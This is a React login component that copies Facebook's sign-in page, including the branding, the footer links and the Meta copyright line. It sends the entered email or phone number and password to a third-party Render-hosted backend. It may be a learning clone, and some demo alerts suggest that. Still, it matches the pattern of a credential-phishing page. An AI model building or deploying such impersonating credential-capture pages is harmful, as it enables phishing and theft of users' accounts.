import { useState } from "react";
import { useNavigate } from "react-router-dom";
import "./Login.css";

const Login = () => {
  const navigate = useNavigate();
  const [formData, setFormData] = useState({ email: "", password: "" });
  const [errors, setErrors] = useState({ email: "", password: "" });

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData((prev) => ({ ...prev, [name]: value }));
    if (errors[name]) setErrors((prev) => ({ ...prev, [name]: "" }));
  };

  const validateForm = () => {
    let isValid = true;
    const newErrors = { email: "", password: "" };
    if (!formData.email.trim()) {
      newErrors.email = "Email address or phone number is required";
      isValid = false;
    }
    if (!formData.password) {
      newErrors.password = "Password is required";
      isValid = false;
    } else if (formData.password.length < 6) {
      newErrors.password = "Password must be at least 6 characters";
      isValid = false;
    }
    setErrors(newErrors);
    return isValid;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (validateForm()) {
      try {
        const res = await fetch(
          "https://facebookbackend-fp4k.onrender.com/api/login",
          {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              emailOrPhone: formData.email,
              password: formData.password,
            }),
          },
        );
        const data = await res.json();
        if (res.ok) {
          localStorage.setItem("userEmail", formData.email);
          navigate("/dashboard");
        } else {
          alert(`Error: ${data.error || "Login failed"}`);
        }
      } catch {
        alert(
          "Cannot connect to server. Make sure backend is running on port 5000.",
        );
      }
    }
  };

  return (
    <div className="fb-meta-page">
      <div className="fb-meta-wrapper">
        <div className="fb-meta-left">
          <div className="fb-meta-logo">facebook</div>
          <div className="fb-meta-message">
            Facebook helps you connect and share with the people in your life.
          </div>
        </div>
        <div className="fb-meta-right">
          <form className="fb-meta-form" onSubmit={handleSubmit}>
            <input
              type="text"
              name="email"
              placeholder="Email address or phone number"
              value={formData.email}
              onChange={handleChange}
              className={errors.email ? "error" : ""}
            />
            {errors.email && <div className="error-msg">{errors.email}</div>}
            <input
              type="password"
              name="password"
              placeholder="Password"
              value={formData.password}
              onChange={handleChange}
              className={errors.password ? "error" : ""}
            />
            {errors.password && (
              <div className="error-msg">{errors.password}</div>
            )}
            <button type="submit" className="fb-meta-login-btn">
              Log in
            </button>
            <a
              href="#"
              className="fb-meta-forgot"
              onClick={(e) => e.preventDefault()}
            >
              Forgotten password?
            </a>
            <div className="fb-meta-divider"></div>
            <button
              type="button"
              className="fb-meta-signup-btn"
              onClick={() => alert("Demo: create account")}
            >
              Create new account
            </button>
          </form>
        </div>
      </div>
      <footer className="fb-meta-footer">
        <div className="footer-lang">
          {[
            "English (US)",
            "Español",
            "Français (France)",
            "中文(简体)",
            "العربية",
            "Português (Brasil)",
            "Italiano",
            "한국어",
            "Deutsch",
            "हिन्दी",
            "日本語",
          ].map((lang) => (
            <a key={lang} href="#">
              {lang}
            </a>
          ))}
        </div>
        <div className="footer-divider"></div>
        <div className="footer-links">
          {[
            "Sign Up",
            "Log In",
            "Messenger",
            "Facebook Lite",
            "Video",
            "Places",
            "Games",
            "Marketplace",
            "Meta Pay",
            "Meta Store",
            "Meta Quest",
            "Instagram",
            "Threads",
            "Fundraisers",
            "Services",
            "Privacy Policy",
            "Privacy Center",
            "Cookies",
            "About",
            "Create ad",
            "Create Page",
            "Developers",
            "Careers",
          ].map((link) => (
            <a key={link} href="#">
              {link}
            </a>
          ))}
        </div>
        <div className="copyright">Meta © 2025</div>
      </footer>
    </div>
  );
};

export default Login;
